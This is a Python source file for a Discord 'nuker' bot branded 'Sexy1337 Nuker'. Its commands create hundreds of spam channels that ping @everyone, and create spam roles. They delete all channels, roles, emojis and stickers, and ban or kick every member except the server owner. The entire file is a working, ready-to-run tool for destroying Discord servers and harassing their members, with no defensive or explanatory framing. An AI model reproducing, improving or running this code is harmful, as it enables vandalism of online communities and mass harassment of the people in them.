import discord
from discord.ext import commands

intents = discord.Intents.default()
intents.members = True
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents, default_help=False)


@bot.event
async def on_ready():
    print(f"Bot is ready. Logged in as {bot.user}")


@bot.command(name="show_help", help="Shows this message")
async def show_help(ctx):
    help_embed = discord.Embed(description='''**Sexy1337 Nuker ;**
        \n**mass channels ;**
        !mc [amount] (text) i.e `!mc 5 test`\n
        **mass channel n ping ;**
        !cp [amount] (text), {message} i.e `!cp 5 test, testing`\n
        **mass roles ;**
        !mr [amount] (text) i.e `!mr 5 test`\n
        **delete channels ;**
        !dc\n
        **delete roles ;**
        !dr\n
        **delete emotes ;**
        !de\n
        **delete stickers (new) ;**
        !ds\n
        **mass kick ;**
        !mk\n
        **mass ban ;**
        !mb
        ''',
                               color=0x36393E)
    help_embed.set_footer(text='© Sexy1337 Nuker')
    await ctx.send(embed=help_embed)


@bot.command(name="mc", help="Mass create text channels")
async def mc(ctx, amount: int, channel_name=None):
    """Mass create text channels."""
    if amount > 500:
        await ctx.send(
            "Amount Error: Max guild channel size is 500 | Tip: Use a number lower than 500"
        )
        return
    for _ in range(amount):
        await ctx.guild.create_text_channel(channel_name
                                            or f'{ctx.author.name} was here')


@bot.command(name="cp", help="Mass create text channels and ping @everyone")
async def cp(ctx, amount: int, channel_name=None, *, ping_message=None):
    """Mass create text channels and ping @everyone."""
    if amount > 500:
        await ctx.send(
            "Amount Error: Max guild channel size is 500 | Tip: Use a number lower than 500"
        )
        return
    for _ in range(amount):
        channel = await ctx.guild.create_text_channel(
            channel_name or f'{ctx.author.name} was here')
        if ping_message:
            await channel.send('@everyone ' + ping_message)


@bot.command(name="mr", help="Mass create roles")
async def mr(ctx, amount: int, role_name=None):
    """Mass create roles."""
    if amount > 250:
        await ctx.send(
            "Amount Error: Max guild role size is 250 | Tip: Use a number lower than 250"
        )
        return
    for _ in range(amount):
        await ctx.guild.create_role(name=role_name or 'nuked',
                                    color=discord.Color.random())


@bot.command(name="dc", help="Delete all channels")
async def dc(ctx):
    """Delete all channels."""
    for channel in ctx.guild.channels:
        await channel.delete()


@bot.command(name="dr", help="Delete all roles")
async def dr(ctx):
    """Delete all roles."""
    for role in ctx.guild.roles:
        if role.name != "@everyone":
            await role.delete()


@bot.command(name="de", help="Delete all emojis")
async def de(ctx):
    """Delete all emojis."""
    for emoji in ctx.guild.emojis:
        await emoji.delete()


@bot.command(name="ds", help="Delete all stickers")
async def ds(ctx):
    """Delete all stickers."""
    for sticker in ctx.guild.stickers:
        await sticker.delete()


@bot.command(name="mb", help="Ban all members")
async def mb(ctx):
    """Ban all members."""
    for member in ctx.guild.members:
        if member != ctx.guild.owner:
            await member.ban()


@bot.command(name="mk", help="Kick all members")
async def mk(ctx):
    """Kick all members."""
    for member in ctx.guild.members:
        if member != ctx.guild.owner:
            await member.kick()


try:
    bot.run('PUT_TOKEN_HERE')
except Exception as e:
    print(e)
